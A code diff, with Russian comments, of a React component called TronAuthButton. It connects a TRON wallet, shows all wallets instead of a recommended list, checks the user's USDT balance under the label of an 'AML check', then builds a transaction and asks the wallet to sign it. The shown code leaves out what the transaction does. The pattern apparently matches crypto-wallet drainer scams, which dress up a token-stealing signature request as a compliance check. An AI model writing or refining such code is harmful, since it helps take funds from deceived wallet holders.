@@ -24,10 +24,8 @@ export const TronAuthButton: React.FC = () => {
         },
       },
       web3ModalConfig: {
-        themeMode: 'dark',
-        explorerRecommendedWalletIds: [
-          // ...твой список
-        ],
+        themeMode: 'dark'
+        // explorerRecommendedWalletIds: [ ... ],   // УДАЛЕНО для отображения всех кошельков
       },
     });
   }
@@ -65,12 +63,11 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
+      // Проверяем USDT баланс до создания транзакции!
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
-
-      // === Проверка на нулевой баланс USDT ===
-      if (usdt === 0) {
+      if (usdt < 0.000001) {
         setModal('❌ No USDT found on this wallet for AML check.');
         await adapter.disconnect();
         setLoading(false);
@@ -91,7 +88,7 @@ export const TronAuthButton: React.FC = () => {
         userAddress
       );
 
-      // Только один раз signTransaction!
+      // Подпись транзакции (одно окно подтверждения всегда)
       const signedTx = await adapter.signTransaction(transaction);
 
       let extra = '';
